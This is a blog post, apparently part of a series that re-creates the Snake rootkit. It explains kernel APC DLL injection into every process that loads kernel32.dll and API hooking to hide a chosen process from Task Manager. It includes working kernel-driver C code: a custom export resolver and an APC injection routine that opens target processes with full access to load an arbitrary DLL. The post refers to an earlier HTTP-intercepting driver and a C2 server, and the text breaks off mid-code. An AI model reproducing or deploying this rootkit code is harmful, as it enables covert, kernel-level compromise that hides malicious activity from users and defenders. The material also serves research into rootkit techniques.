<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Re-creating the Snake Rootkit Part 004: KAPC Injection and Windows API Hooking to Hide Processes</title><style>
      * {
        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
      }
      html, body {
        margin: 0;
        padding: 0;
      }
      h1 {
        font-size: 50px;
        margin-bottom: 17px;
        color: #333;
      }
      h2 {
        font-size: 24px;
        line-height: 1.6;
        margin: 30px 0 0 0;
        margin-bottom: 18px;
        margin-top: 33px;
        color: #333;
      }
      h3 {
        font-size: 30px;
        margin: 10px 0 20px 0;
        color: #333;
      }
      header {
        width: 640px;
        margin: auto;
      }
      section {
        width: 640px;
        margin: auto;
      }
      section p {
        margin-bottom: 27px;
        font-size: 20px;
        line-height: 1.6;
        color: #333;
      }
      section img {
        max-width: 640px;
      }
      footer {
        padding: 0 20px;
        margin: 50px 0;
        text-align: center;
        font-size: 12px;
      }
      .aspectRatioPlaceholder {
        max-width: auto !important;
        max-height: auto !important;
      }
      .aspectRatioPlaceholder-fill {
        padding-bottom: 0 !important;
      }
      header,
      section[data-field=subtitle],
      section[data-field=description] {
        display: none;
      }
      </style></head><body><article class="h-entry">
<header>
<h1 class="p-name">Re-creating the Snake Rootkit Part 004: KAPC Injection and Windows API Hooking to Hide Processes</h1>
</header>
<section data-field="subtitle" class="p-summary">
Obligatory disclaimer: All of the information presented here is for research purposes and should only be used in a legitimate and legal…
</section>
<section data-field="body" class="e-content">
<section name="f733" class="section section--body section--first section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="094f" id="094f" class="graf graf--h3 graf--leading graf--title">Re-creating the Snake Rootkit Part 004: KAPC Injection and Windows API Hooking to Hide Processes</h3><figure name="4730" id="4730" class="graf graf--figure graf-after--h3"><img class="graf-image" data-image-id="0*CmB1FrtA42yP7O75" data-width="612" data-height="498" data-is-featured="true" src="https://cdn-images-1.medium.com/max/800/0*CmB1FrtA42yP7O75"><figcaption class="imageCaption">Source: <a href="https://www.istockphoto.com/photos/snake-xray" data-href="https://www.istockphoto.com/photos/snake-xray" class="markup--anchor markup--figure-anchor" rel="nofollow noopener" target="_blank">https://www.istockphoto.com/photos/snake-xray</a></figcaption></figure><p name="be9e" id="be9e" class="graf graf--p graf-after--figure"><strong class="markup--strong markup--p-strong">Obligatory disclaimer: All of the information presented here is for research purposes and should only be used in a legitimate and legal manner, the author will not be held responsible for any misdoings or illegal activities.</strong></p><p name="b423" id="b423" class="graf graf--p graf-after--p">Since this post ended up being way longer than expected, here is a brief table of contents and a short description of each section:</p><ul class="postList"><li name="9f6c" id="9f6c" class="graf graf--li graf-after--p"><strong class="markup--strong markup--li-strong">Introduction</strong></li><li name="8f6a" id="8f6a" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">Kernel APC (KAPC) Injection</strong> — We go through some introduction to kernel APC injection, some resources for learning more about it and then some examples of how it can be done. Then implement it ourselves.</li><li name="778b" id="778b" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">Creating a DLL to Hide Our Process </strong>— Here we go through how to hook a Windows function in ntdll from scratch and then using MS detrous to do the same, and then modify the data produced by that function, then we go through debugging why the injection did not work when done from the kernel before finally getting a working PoC that hides notepad in task manager</li><li name="91fa" id="91fa" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">Conclusion </strong>— Brief summary of the whole post</li><li name="4e1a" id="4e1a" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">Lessons learned </strong>— What did we learn and how was this learning used.</li><li name="51a6" id="51a6" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">References </strong>— Much the same as this section, here all the resources mentioned in the post are listed along with a brief explanation of the contents of the source.</li><li name="6a51" id="6a51" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">Appendix A: Process Hiding via Unlinking (DKOM) — FAILED </strong>— Initially to hide the processes I tried using DKOM to unlink the process making it invisible, but this was caught by patch guard and caused BSOD</li><li name="9cd1" id="9cd1" class="graf graf--li graf-after--li"><strong class="markup--strong markup--li-strong">Appendix B: Get a pointer to ntdll!LdrLoadDll() — Using Static Offset </strong>— An example of how to get the address of a function using its static offset, was not used due to stability problems. and a custom version of GetProcAddress was created instead.</li></ul><h3 name="d08a" id="d08a" class="graf graf--h3 graf-after--li">Introduction</h3><p name="515b" id="515b" class="graf graf--p graf-after--h3">So what will be covered in this post? Well a lot, but let&#39;s start off by looking at what we already have:</p><p name="8d54" id="8d54" class="graf graf--p graf-after--p">We already have a kernel driver which is able to intercept HTTP communication and forward these commands to a waiting program, which will then execute these. We also have a very basic supporting infrastructure for this channel of communication in the form of a rudimental c2 server.</p><p name="20e8" id="20e8" class="graf graf--p graf-after--p">With that in place, what is the agenda for today? As you might have guessed based on the title and table of contents, we are going to expand our kernel driver to be able to inject dll’s in all processes started by the host. We will then use this dll to hook certain functions, in this case, this will be <code class="markup--code markup--p-code">NtQuerySystemInformation</code> which will be hooked for task manager to hide notepad. This is of course PoC and we can expand on this functionality at a later date. I have included a bunch of the debugging and bug-fixing steps done for inspiration, and to help if you run into a similar issue.</p><h4 name="716a" id="716a" class="graf graf--h4 graf-after--p">Requirements</h4><p name="d73d" id="d73d" class="graf graf--p graf-after--h4">So as stated above our requirements for this part of the project are very simple:</p><ul class="postList"><li name="f4bc" id="f4bc" class="graf graf--li graf-after--p">Use our kernel driver to hide a chosen process in task manager.</li></ul><h4 name="b8d4" id="b8d4" class="graf graf--h4 graf-after--li">Figuring out our approach</h4><p name="ce42" id="ce42" class="graf graf--p graf-after--h4">Well, how are we going to be able to do this? How will we implement our hooks? My initial approach was using Direct Kernel Object Modification (DKOM) — but due to patch guard this leads directly to a BSOD, see <strong class="markup--strong markup--p-strong">Appendix A: Process Hiding via Unlinking (DKOM) — FAILED</strong> for more. Since DKOM did not work I went searching for other ways of doing this and stumbled upon the following excerpt from this article about creating a custom EDR [<a href="https://ethicalchaos.dev/2020/05/27/lets-create-an-edr-and-bypass-it-part-1/" data-href="https://ethicalchaos.dev/2020/05/27/lets-create-an-edr-and-bypass-it-part-1/" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">000</a>] gives a good suggestion, this also aligns with the ideas outlined in “Evading EDR” [001]:</p><blockquote name="ae40" id="ae40" class="graf graf--blockquote graf-after--p">There are various ways EDR’s will do this. Many will chose the <code class="markup--code markup--blockquote-code">PsSetCreateProcessNotifyRoutine</code> to monitor for process creation, but the drawback is that this API can only be used from within a driver, and since we are implementing a simple EDR, we don’t want to be going down that route. So instead we can use WMI to monitor for new process events.</blockquote><p name="78ea" id="78ea" class="graf graf--p graf-after--blockquote">Alright, so it seems that we can create a callback routine which will notify us whenever a process is created or dll loaded, sounds like just what we need!</p><p name="f155" id="f155" class="graf graf--p graf-after--p">To accomplish this two central techniques will be used, first to get our desired functionality to execute in a target process we will be injecting a dll in the process using Kernel APC injection (mentioned in “Evading EDR” [001]). Next, once we have code running, we will use said code to hook Windows API functions and use these to filter their output to hide our process.</p><p name="753f" id="753f" class="graf graf--p graf-after--p">With that figured out, let&#39;s get started!</p><h3 name="f8c7" id="f8c7" class="graf graf--h3 graf-after--p">Kernel APC (KAPC) Injection</h3><h4 name="550d" id="550d" class="graf graf--h4 graf-after--h3">Introduction</h4><p name="8d74" id="8d74" class="graf graf--p graf-after--h4">So with all that covered, we have our task cut out for us. We need some way of executing code in the different processes in order to hide our target process. As previously mentioned we will use the built-in functionality and register a callback whenever a dll is loaded by the application.</p><p name="5ae4" id="5ae4" class="graf graf--p graf-after--p">Then for our actual code execution part we will be using Kernel APC (KAPC) Injecitons to load a target DLL into the more space of the target application, this will then allow us to execute the DllMain functionality of the DLL.</p><p name="b903" id="b903" class="graf graf--p graf-after--p">But what is KAPC injection? Well, to put it simply it is a way to queue a APC call in an application running in userland. We then use this procedure call together with a way of loading a DLL such as LoadLibraryExA to get our DLL loaded and running in the application of choice.</p><p name="0f88" id="0f88" class="graf graf--p graf-after--p">Here is, an abbreviated version of, how it is explained by the CIA [<a href="https://wikileaks.org/ciav7p1/cms/page_7995519.html" data-href="https://wikileaks.org/ciav7p1/cms/page_7995519.html" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">002</a>]:</p><blockquote name="3a6e" id="3a6e" class="graf graf--blockquote graf-after--p"><strong class="markup--strong markup--blockquote-strong">Method 2: Queue User APC to new Thread</strong></blockquote><blockquote name="069e" id="069e" class="graf graf--blockquote graf-after--blockquote">This method requires the kernel code to have a way of getting to a Thread before it is started. Typically this is accomplished through registering a CreateThreadNotifyRoutine (CTNR). When the CreateThreadNotifyRoutine is called, one of two different scenarios could be happening:</blockquote><blockquote name="1d85" id="1d85" class="graf graf--blockquote graf-after--blockquote">A thread is dying. The CTNR is called in the context of the dying thread. This doesn’t really help us.</blockquote><blockquote name="4f29" id="4f29" class="graf graf--blockquote graf-after--blockquote">A thread is being created. The CTNR is called in the context of the thread that is creating the new thread. This is helpful.</blockquote><blockquote name="e6f8" id="e6f8" class="graf graf--blockquote graf-after--blockquote">After verifying that the CTNR was called for thread creation, the kernel code can do some basic checks to see if the thread is being created in an interesting process. The important thing to remember about running code in the CTNR is that <strong class="markup--strong markup--blockquote-strong">NO</strong> new threads can be created until each CTNR is finished. If your CTNR code takes 1 minute to run, then you’ve bottlenecked thread creation to 1 new thread a minute (extreme example of course). Whatever you do in the CTNR, make sure it’s quick.</blockquote><blockquote name="325f" id="325f" class="graf graf--blockquote graf-after--blockquote">To Queue an APC to the thread being created, the kernel code needs to have the ETHREAD structure for the new thread. In Windows 7, and according to the MSDN (which never lies…) you can call PsLookupThreadByThreadId to obtain a handle to the ETHREAD structure. In Windows XP, this will not work due to a code check that fails. It is thought that Windows XP fails to retrieve the ETHREAD structure at this point, because it is not fully created/added to the list of objects.</blockquote><blockquote name="f94b" id="f94b" class="graf graf--blockquote graf-after--blockquote">Next, you need to attach to the process’ context using KeStackAttachProcess(), which has 2 parameters. The first parameter is a handle to the EPROCESS struct (Obtained by calling PsGetCurrentProcess()). The second parameter is a pointer to memory allocated for a KAPC struct (using ExAllocatePool). Save the KAPC memory pointer, as it will be needed later to detach.</blockquote><blockquote name="1efc" id="1efc" class="graf graf--blockquote graf-after--blockquote">After attaching, you must use ZwAllocateVirtualMemory twice. Once to allocate memory for your APC parameter. For example, if your APC is going to inject a DLL into a target process, then you need to allocate memory for the DLL name to inject, and the address of LoadLibraryA. The second memory allocation is for your user APC code.</blockquote><blockquote name="6e1f" id="6e1f" class="graf graf--blockquote graf-after--blockquote">…</blockquote><blockquote name="999f" id="999f" class="graf graf--blockquote graf-after--blockquote">At this point, your APC is ready to run with KeInitializeApc and KeInsertQueueApc.</blockquote><blockquote name="f21d" id="f21d" class="graf graf--blockquote graf-after--blockquote">…</blockquote><blockquote name="04cb" id="04cb" class="graf graf--blockquote graf-after--blockquote">At this point you’re done. The APC should execute before the new thread runs, in the context of the new thread. If you did a simple DLL load with LoadLibraryA, you’ll end up injecting a DLL into the process the new thread is going to run in.</blockquote><blockquote name="4af1" id="4af1" class="graf graf--blockquote graf-after--blockquote">This method is documented in the MSDN, but you can’t trust that, so it may dissapear randomly one day… Works currently on Windows 7 x64.</blockquote><p name="519d" id="519d" class="graf graf--p graf-after--blockquote">All of the code for creating a simple KAPC injection driver can be found on my GitHub:</p><div name="94d9" id="94d9" class="graf graf--mixtapeEmbed graf-after--p"><a href="https://github.com/0xOvid/RootkitDiaries/tree/main/KAPC_Injection" data-href="https://github.com/0xOvid/RootkitDiaries/tree/main/KAPC_Injection" class="markup--anchor markup--mixtapeEmbed-anchor" title="https://github.com/0xOvid/RootkitDiaries/tree/main/KAPC_Injection"><strong class="markup--strong markup--mixtapeEmbed-strong">RootkitDiaries/KAPC_Injection at main · 0xOvid/RootkitDiaries</strong><br><em class="markup--em markup--mixtapeEmbed-em">Collection of different rootkit functionality, each driver representing a different rootkit component …</em>github.com</a><a href="https://github.com/0xOvid/RootkitDiaries/tree/main/KAPC_Injection" class="js-mixtapeImage mixtapeImage mixtapeImage--empty u-ignoreBlock" data-media-id="f213c78a73e02f86658fef244c0db373"></a></div><p name="8fb3" id="8fb3" class="graf graf--p graf-after--mixtapeEmbed">A small word of caution: This is highly complex and requires a bunch of time spent researching, implementing and bug fixing. So if you decide to replicate this or create your own, just know that it will take a while and will cause a bunch of headaches. Stuff goes wrong and it is tricky to debug … and there is a lot of Microsoft documentation to read through</p><h4 name="39d1" id="39d1" class="graf graf--h4 graf-after--p">Requirements</h4><p name="a1c6" id="a1c6" class="graf graf--p graf-after--h4">The requirement is that a custom dll be loaded into every process which loads kernel32.dll</p><h4 name="43bf" id="43bf" class="graf graf--h4 graf-after--p">Get the address of LoadLibraryExA</h4><p name="417f" id="417f" class="graf graf--p graf-after--h4">Another way of doing this is by using the static offset of a function and its base address to get the proper pointer, this is however not very reliable and prone to error, for an example of how that looks please see: <strong class="markup--strong markup--p-strong">Appendix B: Get a pointer to ntdll!LdrLoadDll() — Using Static Offset.</strong></p><p name="dce0" id="dce0" class="graf graf--p graf-after--p">For reliability&#39;s sake, we will instead be using the name of the function to call, and by parsing the PE header of kernel32.dll get the appropriate offset for the function to call.</p><figure name="1dde" id="1dde" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*3UsWaxsRqbLHtIn4QhNaBQ.png" data-width="595" data-height="85" src="https://cdn-images-1.medium.com/max/800/1*3UsWaxsRqbLHtIn4QhNaBQ.png"><figcaption class="imageCaption">Kernel driver finding the target library</figcaption></figure><p name="7ebf" id="7ebf" class="graf graf--p graf-after--figure">Using Process Hacker and CFF to check that we are getting the right offset.</p><figure name="fc2e" id="fc2e" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*fEww1PlVuhRrJTbz2G3HpA.png" data-width="1063" data-height="583" src="https://cdn-images-1.medium.com/max/800/1*fEww1PlVuhRrJTbz2G3HpA.png"><figcaption class="imageCaption">Getting the address of LoadLibraryA manually</figcaption></figure><p name="9e37" id="9e37" class="graf graf--p graf-after--figure">Here we will need the RVA since this represents where the function will recide in memory. Checking our work:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="yaml" name="f2c3" id="f2c3" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-number">0x7ffb16640000</span> <span class="hljs-string">+</span> <span class="hljs-number">0x1d610</span> <span class="hljs-string">=</span> <span class="hljs-number">0x7FFB1665D610</span></span></pre><p name="c49d" id="c49d" class="graf graf--p graf-after--pre">Which is correct!</p><p name="1fb2" id="1fb2" class="graf graf--p graf-after--p">Custom GetProcAddress then looks like this:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="cpp" name="7c56" id="7c56" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ntimage.h&gt;</span></span><br /><span class="hljs-function">PVOID <span class="hljs-title">CustomGetProcAddress</span><span class="hljs-params">(PVOID pModuleBase, UNICODE_STRING functionName)</span> </span>{<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(functionName);<br /> <span class="hljs-comment">// Check PE header for magic bytes</span><br /> PIMAGE_DOS_HEADER ImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;<br /> <span class="hljs-keyword">if</span> (ImageDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) {<br />  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br /> }<br /> <span class="hljs-comment">// Check PE header for signature</span><br /> PIMAGE_NT_HEADERS ImageNtHeaders = ((PIMAGE_NT_HEADERS)(<span class="hljs-built_in">RtlOffsetToPointer</span>(pModuleBase, ImageDosHeader-&gt;e_lfanew)));<br /> <span class="hljs-keyword">if</span> (ImageNtHeaders-&gt;Signature != IMAGE_NT_SIGNATURE) {<br />  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br /> }<br /> <span class="hljs-comment">// Check Optional Headers</span><br /> <span class="hljs-keyword">if</span> (!(ImageNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="hljs-number">0</span>].VirtualAddress &amp;&amp;<br />  <span class="hljs-number">0</span> &lt; ImageNtHeaders-&gt;OptionalHeader.NumberOfRvaAndSizes)) {<br />  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br /> }<br /> <span class="hljs-comment">// Get address of Export directory</span><br /> PIMAGE_EXPORT_DIRECTORY ImageExport = (((PIMAGE_EXPORT_DIRECTORY)(PUCHAR)<span class="hljs-built_in">RtlOffsetToPointer</span>(pModuleBase, ImageNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="hljs-number">0</span>].VirtualAddress)));<br /> <span class="hljs-comment">// Check for export directory</span><br /> <span class="hljs-keyword">if</span> (!(ImageExport))<br /> {<br />  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br /> }<br /> PULONG AddressOfNames = ((PULONG)<span class="hljs-built_in">RtlOffsetToPointer</span>(pModuleBase, ImageExport-&gt;AddressOfNames));<br /> <span class="hljs-keyword">for</span> (ULONG n = <span class="hljs-number">0</span>; n &lt; ImageExport-&gt;NumberOfNames; ++n)<br /> {<br />  LPSTR FunctionName = ((LPSTR)<span class="hljs-built_in">RtlOffsetToPointer</span>(pModuleBase, AddressOfNames[n]));<br />  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;LoadLibraryExA&quot;</span>, FunctionName) == <span class="hljs-number">0</span>) {<br />   PULONG AddressOfFunctions = ((PULONG)<span class="hljs-built_in">RtlOffsetToPointer</span>(pModuleBase, ImageExport-&gt;AddressOfFunctions));<br />   PUSHORT AddressOfOrdinals = ((PUSHORT)<span class="hljs-built_in">RtlOffsetToPointer</span>(pModuleBase, ImageExport-&gt;AddressOfNameOrdinals));<br /><br />   PVOID pFnLoadLibraryExA = ((PVOID)<span class="hljs-built_in">RtlOffsetToPointer</span>(pModuleBase, AddressOfFunctions[AddressOfOrdinals[n]]));<br /><br />   <span class="hljs-built_in">KdPrint</span>((<span class="hljs-string">&quot;[+] FOUND! functionName %s @ %p\n&quot;</span>, FunctionName, pFnLoadLibraryExA));<br />   <br />   <span class="hljs-keyword">return</span> pFnLoadLibraryExA;<br />  }<br /> }<br /> <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br />}</span></pre><h4 name="eb7b" id="eb7b" class="graf graf--h4 graf-after--pre">Basic PoC</h4><p name="a8fe" id="a8fe" class="graf graf--p graf-after--h4">The following implementation of Kernel APC injection is based on the blog post [<a href="https://alexvogtkernel.blogspot.com/2018/09/kernel-injection-code-reversing-sirifef.html" data-href="https://alexvogtkernel.blogspot.com/2018/09/kernel-injection-code-reversing-sirifef.html" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">003</a>]and associated code [<a href="https://github.com/alexvogt91/Kernel-dll-injector/blob/master/Sirifef/Sirifef/Sf.c" data-href="https://github.com/alexvogt91/Kernel-dll-injector/blob/master/Sirifef/Sirifef/Sf.c" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">004</a>] by AV/alexvogt91. The code however was made for older versions of Windows and using 32-bit, which meant that many different modifications had to be made in order to get everything working. Most of the code was also cleaned up so it was easier for me to understand. Likewise, I took the descriptions from the original blog post and added them into the codebase since they did a good job of explaining what was going on.</p><p name="e741" id="e741" class="graf graf--p graf-after--p">The main changes are:</p><ul class="postList"><li name="516e" id="516e" class="graf graf--li graf-after--p">I updated and flattened the custom GetProcAddress function to make it more readable</li><li name="db39" id="db39" class="graf graf--li graf-after--li">The DLL injection functionality was broken and was fixed by updating how the driver gets a handle of the process of injecting into</li></ul><p name="771a" id="771a" class="graf graf--p graf-after--li">This along with many smaller tweaks leads to a working prototype that injects DLLs into every process loading kernel32dll, which should be more or less all of them.</p><p name="41d3" id="41d3" class="graf graf--p graf-after--p">The approach chosen here has the benefit of being much simpler than other methods I was able to find documentation on [<a href="https://github.com/wbenny/injdrv/blob/master/README.md" data-href="https://github.com/wbenny/injdrv/blob/master/README.md" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">005</a>], [<a href="https://github.com/ChengChengCC/Ark-tools/blob/046474e4b53e674405bc94d75d3a28a732839b96/Inject_By_kernelAPC/ring0/KeInjectApc.c" data-href="https://github.com/ChengChengCC/Ark-tools/blob/046474e4b53e674405bc94d75d3a28a732839b96/Inject_By_kernelAPC/ring0/KeInjectApc.c" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">006</a>], [<a href="https://github.com/adrianyy/KeInject/tree/master" data-href="https://github.com/adrianyy/KeInject/tree/master" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">007</a>], [<a href="https://github.com/Rhydon1337/windows-kernel-dll-injector/tree/main" data-href="https://github.com/Rhydon1337/windows-kernel-dll-injector/tree/main" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">008</a>], [<a href="https://github.com/OlSut/Kinject-x64" data-href="https://github.com/OlSut/Kinject-x64" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">009</a>], [<a href="https://dennisbabkin.com/blog/?t=depths-of-windows-apc-aspects-of-asynchronous-procedure-call-internals-from-kernel-mode#apc_demo" data-href="https://dennisbabkin.com/blog/?t=depths-of-windows-apc-aspects-of-asynchronous-procedure-call-internals-from-kernel-mode#apc_demo" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">010</a>], [<a href="https://dennisbabkin.com/blog/?i=AAA10800" data-href="https://dennisbabkin.com/blog/?i=AAA10800" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">011</a>], [<a href="https://github.com/suvllian/process-inject/blob/master/Src/APCInject%28Ring0%29.c" data-href="https://github.com/suvllian/process-inject/blob/master/Src/APCInject(Ring0).c" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">012</a>], [<a href="https://github.com/daem0nc0re/VectorKernel/tree/main/InjectLibrary" data-href="https://github.com/daem0nc0re/VectorKernel/tree/main/InjectLibrary" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">013</a>].</p><figure name="21b4" id="21b4" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*r7_F1FHLl_Ina9eC9UvPJw.png" data-width="1104" data-height="702" src="https://cdn-images-1.medium.com/max/800/1*r7_F1FHLl_Ina9eC9UvPJw.png"><figcaption class="imageCaption">Injection successful</figcaption></figure><p name="c73a" id="c73a" class="graf graf--p graf-after--figure">Also inspecting the taskmgr.exe process in Process Hacker we see that our dll has successfully been injected.</p><figure name="64b1" id="64b1" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*jcszUFY0u7c7_oUOi301EA.png" data-width="1119" data-height="731" src="https://cdn-images-1.medium.com/max/800/1*jcszUFY0u7c7_oUOi301EA.png"><figcaption class="imageCaption">Verifying DLL injection</figcaption></figure><p name="49c8" id="49c8" class="graf graf--p graf-after--figure">In the end, the code for the driver looks like this:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="cpp" name="3d41" id="3d41" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ntifs.h&gt;</span></span><br /><br /><span class="hljs-comment">/*<br />Defining basic data structures<br />*/</span><br /><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">PVOID</span><span class="hljs-params">(*fnLoadLibraryExA)</span><span class="hljs-params">(<br /> LPCSTR lpLibFileName,<br /> HANDLE hFile,<br /> ULONG dwFlag<br /> )</span></span>;<br /><br /><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_INJECTION_DATA</span> <span class="hljs-comment">// _SIRIFEF_INJECTION_DATA in article</span><br />{<br /> BOOLEAN Executing;<br /> PEPROCESS Process;<br /> PETHREAD Ethread;<br /> KEVENT Event;<br /> WORK_QUEUE_ITEM WorkItem;<br /> ULONG ProcessId;<br />} INJECTION_DATA, * P_INJECTION_DATA;<br /><br /><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">GET_ADDRESS</span><br />{<br /> PVOID Kernel32dll;<br /> fnLoadLibraryExA pvLoadLibraryExA;<br />}GET_ADDRESS, * PGET_ADDRESS;<br /><br /><span class="hljs-comment">// Define undocumented structures</span><br /><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">_KAPC_ENVIRONMENT</span><br />{<br /> OriginalApcEnvironment,<br /> AttachedApcEnvironment,<br /> CurrentApcEnvironment,<br /> InsertApcEnvironment<br />}KAPC_ENVIRONMENT, * PKAPC_ENVIRONMENT;<br /><br /><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">VOID</span><span class="hljs-params">(NTAPI* PKNORMAL_ROUTINE)</span><span class="hljs-params">(<br /> PVOID NormalContext,<br /> PVOID SystemArgument1,<br /> PVOID SystemArgument2<br /> )</span></span>;<br /><br /><span class="hljs-function"><span class="hljs-keyword">typedef</span> VOID <span class="hljs-title">KKERNEL_ROUTINE</span><span class="hljs-params">(<br /> PRKAPC Apc,<br /> PKNORMAL_ROUTINE* NormalRoutine,<br /> PVOID* NormalContext,<br /> PVOID* SystemArgument1,<br /> PVOID* SystemArgument2<br />)</span></span>;<br /><br /><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">KKERNEL_ROUTINE</span><span class="hljs-params">(NTAPI* PKKERNEL_ROUTINE)</span></span>;<br /><br /><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">VOID</span><span class="hljs-params">(NTAPI* PKRUNDOWN_ROUTINE)</span><span class="hljs-params">(<br /> PRKAPC Apc<br /> )</span></span>;<br /><br /><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">KeInitializeApc</span><span class="hljs-params">(<br /> PRKAPC Apc,<br /> PRKTHREAD Thread,<br /> KAPC_ENVIRONMENT Environment,<br /> PKKERNEL_ROUTINE KernelRoutine,<br /> PKRUNDOWN_ROUTINE RundownRoutine,<br /> PKNORMAL_ROUTINE NormalRoutine,<br /> KPROCESSOR_MODE ProcessorMode,<br /> PVOID NormalContext<br />)</span></span>;<br /><br /><span class="hljs-function">BOOLEAN <span class="hljs-title">KeInsertQueueApc</span><span class="hljs-params">(<br /> PRKAPC Apc,<br /> PVOID SystemArgument1,<br /> PVOID SystemArgument2,<br /> KPRIORITY Increment<br />)</span></span>;<br /><br />PVOID pLoadLibraryExA = { <span class="hljs-number">0</span> };<br /><br /><span class="hljs-function">VOID NTAPI <span class="hljs-title">APCKernelRoutine</span><span class="hljs-params">(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* SysArg1, PVOID* SysArg2, PVOID* Context)</span><br /></span>{<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(Apc);<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(NormalRoutine);<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(SysArg1);<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(SysArg2);<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(Context);<br /> <span class="hljs-built_in">ExFreePool</span>(Apc);<br /> <span class="hljs-keyword">return</span>;<br />}<br /><br /><span class="hljs-function">NTSTATUS <span class="hljs-title">DllInject</span><span class="hljs-params">(HANDLE ProcessId, PEPROCESS PeProcess, PETHREAD PeThread, BOOLEAN Alert)</span><br /></span>{<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(ProcessId);<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(PeProcess);<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(PeThread);<br /> <span class="hljs-built_in">UNREFERENCED_PARAMETER</span>(Alert);<br /><br /> NTSTATUS status;<br /><br /><br /> <span class="hljs-comment">// 3) open the target process using the id that we gather before </span><br /> HANDLE hProcess; <span class="hljs-comment">// The ZwOpenProcess routine writes the process handle to the </span><br /> <span class="hljs-comment">// variable that this parameter points to.</span><br /> OBJECT_ATTRIBUTES objectAttributes = { <span class="hljs-built_in">sizeof</span>(OBJECT_ATTRIBUTES) };<br /> CLIENT_ID clientId;<br /><br /> <span class="hljs-built_in">InitializeObjectAttributes</span>(&amp;objectAttributes,<br />  <span class="hljs-literal">NULL</span>,<br />  OBJ_KERNEL_HANDLE,<br />  <span class="hljs-literal">NULL</span>,<br />  <span class="hljs-literal">NULL</span>);<br /> clientId.UniqueProcess = <span class="hljs-built_in">PsGetProcessId</span>(PeProcess);ProcessId;<br /> clientId.UniqueThread = (HANDLE)<span class="hljs-number">0</span>;<br /> status = <span class="hljs-built_in">ZwOpenProcess</span>(&amp;hProcess,<br />  PROCESS_ALL_ACCESS,<br />  &amp;objectAttributes,<br />  &amp;clientId);<br /> <span class="hljs-comment">// Check for successfull allocation</span><br /> <span class="hljs-keyword">if</span> (!(<span class="hljs-built_in">NT_SUCCESS</span>(status)))<br /> {<br />  <span class="hljs-built_in">KdPrint</span>((<span class="hljs-string">&quot;[ERROR] ZwOpenProcess Failed\n&quot;</span>));<br />  <span class="hljs-keyword">return</span> STATUS_NO_MEMORY;<br /> }<br /><br /> <span class="hljs-comment">// 1) define our dll path: &#x27;&#x27;C:\\MyDLL.dll&quot; in the sample</span><br /> CHAR DllFormatPath[] = <span class="hljs-string">&quot;C:\\MyDLL.dll&quot;</span>;<br /> <span class="hljs-comment">// 2) get the size in bytes of the string</span><br /> SIZE_T Size = <span class="hljs-built_in">strlen</span>(DllFormatPath) + <span class="hljs-number">1</span>;<br /> PVOID pvMemory = <span class="hljs-literal">NULL</span>;<br /> <span 